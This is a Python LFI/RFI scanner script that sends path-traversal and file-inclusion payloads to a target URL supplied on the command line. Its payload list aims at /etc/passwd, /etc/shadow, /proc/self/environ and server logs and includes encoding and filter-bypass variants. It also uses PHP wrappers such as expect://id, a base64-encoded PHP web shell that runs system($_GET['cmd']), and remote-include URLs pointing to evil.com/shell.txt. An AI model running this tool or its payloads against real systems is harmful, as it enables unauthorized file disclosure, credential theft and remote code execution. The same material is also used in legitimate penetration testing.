#!/usr/bin/env python3
"""
LFI/RFI Scanner
Tests for Local and Remote File Inclusion vulnerabilities
"""

import requests
import urllib.parse
import json
from datetime import datetime
from bs4 import BeautifulSoup

class LFIRFIScanner:
    """Local and Remote File Inclusion scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # LFI payloads
        self.lfi_payloads = [
            # Basic LFI
            ('../../../etc/passwd', ['root:', 'daemon:', '/bin/bash']),
            ('../../../../etc/passwd', ['root:', 'daemon:', '/bin/bash']),
            ('../../../../../etc/passwd', ['root:', 'daemon:', '/bin/bash']),
            ('../../../../../../etc/passwd', ['root:', 'daemon:', '/bin/bash']),
            ('../../../../../../../etc/passwd', ['root:', 'daemon:', '/bin/bash']),

            # Windows
            ('../../../windows/win.ini', ['[fonts]', '[extensions]']),
            ('../../../windows/system32/drivers/etc/hosts', ['127.0.0.1', 'localhost']),
            ('c:\\windows\\win.ini', ['[fonts]', '[extensions]']),
            ('c:/windows/win.ini', ['[fonts]', '[extensions]']),

            # Null byte (older PHP versions)
            ('../../../etc/passwd%00', ['root:', 'daemon:']),
            ('../../../etc/passwd%00.jpg', ['root:', 'daemon:']),

            # URL encoding
            ('..%2F..%2F..%2Fetc%2Fpasswd', ['root:', 'daemon:']),
            ('..%252F..%252F..%252Fetc%252Fpasswd', ['root:', 'daemon:']),

            # Double encoding
            ('..%252f..%252f..%252fetc%252fpasswd', ['root:', 'daemon:']),

            # UTF-8 encoding
            ('..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', ['root:', 'daemon:']),

            # Path truncation
            ('../../../etc/passwd' + 'A' * 2048, ['root:', 'daemon:']),

            # Filter bypass
            ('....//....//....//etc/passwd', ['root:', 'daemon:']),
            ('....\/....\/....\/etc/passwd', ['root:', 'daemon:']),
            ('..//..//..//etc/passwd', ['root:', 'daemon:']),

            # Absolute paths
            ('/etc/passwd', ['root:', 'daemon:']),
            ('/etc/shadow', ['root:', 'daemon:']),
            ('/etc/hosts', ['127.0.0.1', 'localhost']),
            ('/proc/self/environ', ['PATH=', 'HOME=']),
            ('/var/log/apache2/access.log', ['GET', 'POST', 'HTTP']),
            ('/var/log/apache2/error.log', ['PHP', 'error']),

            # PHP wrappers
            ('php://filter/convert.base64-encode/resource=index.php', ['<?php', 'PD9waHA']),
            ('php://filter/read=string.rot13/resource=index.php', ['<?cuc', 'shapgvba']),
            ('expect://id', ['uid=', 'gid=']),
            ('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+', ['<?php']),

            # Log poisoning prep
            ('/var/log/apache/access.log', ['GET', 'POST']),
            ('/var/log/nginx/access.log', ['GET', 'POST']),
        ]

        # RFI payloads (requires external server)
        self.rfi_payloads = [
            'http://evil.com/shell.txt',
            'https://evil.com/shell.txt',
            'ftp://evil.com/shell.txt',
            '//evil.com/shell.txt',
            'http://127.0.0.1/shell.txt',
        ]

    def scan(self):
        """Run LFI/RFI scan"""
        print(f"[*] Starting LFI/RFI scan on {self.target_url}")

        # Test for LFI
        self._test_lfi()

        # Test for RFI
        self._test_rfi()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_lfi(self):
        """Test for Local File Inclusion"""
        print("[*] Testing for LFI...")

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            # Try common parameter names
            params = {
                'file': ['index.php'],
                'page': ['home'],
                'include': ['header.php'],
                'path': ['/var/www'],
                'doc': ['readme'],
                'load': ['main'],
                'template': ['default']
            }

        for param_name in params.keys():
            for payload, indicators in self.lfi_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                if self._test_lfi_payload(test_url, param_name, payload, indicators):
                    return  # Found vulnerability

    def _test_rfi(self):
        """Test for Remote File Inclusion"""
        print("[*] Testing for RFI...")

        parsed = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            params = {
                'file': ['index.php'],
                'page': ['home'],
                'include': ['header.php']
            }

        for param_name in params.keys():
            for payload in self.rfi_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]

                query_string = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

                if self._test_rfi_payload(test_url, param_name, payload):
                    return  # Found vulnerability

    def _test_lfi_payload(self, url, param_name, payload, indicators):
        """Test single LFI payload"""
        try:
            response = self.session.get(url, timeout=10)

            # Check for file content indicators
            for indicator in indicators:
                if indicator in response.text:
                    vuln = {
                        'type': 'Local File Inclusion (LFI)',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': f'File content exposed: found "{indicator}"',
                        'cwe': 'CWE-98'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: LFI found in {param_name}")
                    return True

            # Check for PHP warning/error messages indicating file access attempt
            error_indicators = [
                'failed to open stream',
                'No such file or directory',
                'Permission denied',
                'include(',
                'require(',
                'fopen(',
                'file_get_contents('
            ]

            for error in error_indicators:
                if error in response.text:
                    vuln = {
                        'type': 'Possible LFI (Error-based)',
                        'severity': 'high',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': f'File inclusion error detected: {error}',
                        'cwe': 'CWE-98'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Possible LFI (error-based) in {param_name}")
                    return True

        except Exception as e:
            pass

        return False

    def _test_rfi_payload(self, url, param_name, payload):
        """Test single RFI payload"""
        try:
            response = self.session.get(url, timeout=15)

            # Check for connection attempts or errors
            rfi_indicators = [
                'failed to open stream',
                'HTTP request failed',
                'Connection refused',
                'getaddrinfo failed',
                'No route to host',
                'allow_url_include',
                'allow_url_fopen'
            ]

            for indicator in rfi_indicators:
                if indicator in response.text:
                    vuln = {
                        'type': 'Remote File Inclusion (RFI)',
                        'severity': 'critical',
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': f'RFI attempt detected: {indicator}',
                        'cwe': 'CWE-98'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] CRITICAL: RFI found in {param_name}")
                    return True

            # Check if external content was loaded (would need actual test server)
            # This is a basic check
            if 'evil.com' in response.text.lower():
                vuln = {
                    'type': 'Remote File Inclusion (RFI)',
                    'severity': 'critical',
                    'url': url,
                    'parameter': param_name,
                    'payload': payload,
                    'evidence': 'Remote file content appears to be included',
                    'cwe': 'CWE-98'
                }
                self.vulnerabilities.append(vuln)
                print(f"[!] CRITICAL: RFI confirmed in {param_name}")
                return True

        except Exception as e:
            pass

        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 lfi_rfi_scanner.py <url>")
        print("\nExample:")
        print("  python3 lfi_rfi_scanner.py https://example.com/page?file=index.php")
        sys.exit(1)

    scanner = LFIRFIScanner(sys.argv[1])
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")

    if len(results['vulnerabilities']) > 0:
        print(f"\n[!] CRITICAL: File inclusion vulnerabilities detected!")
        print(f"    These can lead to:")
        print(f"    - Arbitrary file disclosure")
        print(f"    - Remote code execution")
        print(f"    - Server compromise")
